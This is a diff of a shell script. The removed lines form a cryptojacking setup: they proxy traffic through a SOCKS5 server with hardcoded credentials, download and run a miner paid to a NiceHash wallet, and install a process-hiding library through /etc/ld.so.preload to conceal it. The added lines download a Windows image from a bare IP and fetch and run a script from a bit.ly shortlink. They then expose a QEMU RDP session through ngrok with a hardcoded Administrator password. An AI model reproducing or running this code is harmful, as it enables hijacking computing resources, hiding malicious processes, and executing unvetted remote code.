@@ -1,65 +1,65 @@
-#!/bin/sh
+#! /bin/bash
+# Make Instance Ready for Remote Desktop or RDP
+apt-get update
+rm -rf win2022 win2022.img win2022.gz ngrok ngrok.zip ng.sh > /dev/null 2>&1
+echo "Download windows files"
+wget -O win2022.gz http://52.221.192.24/windows2022.gz
+gunzip win2022.gz
+echo "Wait..."
+echo "I m Working Now.."
+mv win2022 win2022.img
+wget -O ng.sh https://bit.ly/GCngr0k > /dev/null 2>&1
+chmod +x ng.sh
+./ng.sh
+clear
+echo "======================="
+echo choose ngrok region
+echo "======================="
+echo "us - United States (Ohio)"
+echo "eu - Europe (Frankfurt)"
+echo "ap - Asia/Pacific (Singapore)"
+echo "au - Australia (Sydney)"
+echo "sa - South America (Sao Paulo)"
+echo "jp - Japan (Tokyo)"
+echo "in - India (Mumbai)"
+read -p "choose ngrok region: " CRP
+./ngrok tcp --region $CRP 3388 &>/dev/null &
+clear
+echo Downloading files from aank.me
+apt-get install qemu-system-x86 -y
+echo "Wait..."
+echo "Starting Windows"
+qemu-system-x86_64 -hda win2022.img -m 500T -smp cores=64 -net user,hostfwd=tcp::3388-:3389 -net nic -object rng-random,id=rng0,filename=/dev/urandom -device virtio-rng-pci,rng=rng0 -vga vmware -nographic &>/dev/null &
+clear
+echo RDP Address:
+curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"tcp:..([^"]*).*/\1/p'
+echo "===================================="
+echo "Username: Administrator"
+echo "Password: Lingg@H0sting"
+echo "===================================="
+echo "===================================="
+echo "Don't closse this Tab"
+echo "Wait 1 - 3 minut for finishing bot"
+echo "RDP run up to 50 hours"
+echo "Support YT Channel-> Aank is ME, thankyou"
+echo "Link-> https://aank.me/Youtube"
+echo "===================================="
+b='\033[1m'
+r='\E[31m'
+g='\E[32m'
+c='\E[36m'
+endc='\E[0m'
+enda='\033[0m'
+# Branding
 
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-
-dpkg-reconfigure --frontend noninteractive tzdata
-
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
-
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
-
-tar -xvzf graphics.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
-
-listen = :2233
-
-loglevel = 1
-
-socks5 = 52.15.235.202:1080
-
-socks5_username = mikrotik999
-
-socks5_password = Elibawnos
-
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-echo " "
-
-echo " "
-
-echo "**"
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-
-echo " "
-
-echo "**"
-
-echo " "
-
-echo " "
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
-
-chmod +x bezzHash
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-
-unzip magicBezzHash.zip
-
-make
-
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-
-mv libprocesshider.so /usr/local/lib/
-
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./graftcp/graftcp ./bezzHash --url=ssl://3BsJ6cvtviyvS6tWfFWaDGHStB8pTHUrNH@daggerhashimoto.usa-west.nicehash.com:33353 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+printf """$c$b
+ 
+██╗     ██╗███╗   ██╗ ██████╗  ██████╗  █████╗ ██╗  ██╗ ██████╗ ███████╗████████╗██╗███╗   ██╗ ██████╗ 
+██║     ██║████╗  ██║██╔════╝ ██╔════╝ ██╔══██╗██║  ██║██╔═══██╗██╔════╝╚══██╔══╝██║████╗  ██║██╔════╝ 
+██║     ██║██╔██╗ ██║██║  ███╗██║  ███╗███████║███████║██║   ██║███████╗   ██║   ██║██╔██╗ ██║██║  ███╗
+██║     ██║██║╚██╗██║██║   ██║██║   ██║██╔══██║██╔══██║██║   ██║╚════██║   ██║   ██║██║╚██╗██║██║   ██║
+███████╗██║██║ ╚████║╚██████╔╝╚██████╔╝██║  ██║██║  ██║╚██████╔╝███████║   ██║   ██║██║ ╚████║╚██████╔╝
+╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝╚═╝  ╚═══╝ ╚═════╝
+    $r  Support YT Channel-> Aank is ME © 2022 $c https://aank.me/Youtube 
+          
+$endc$enda""";
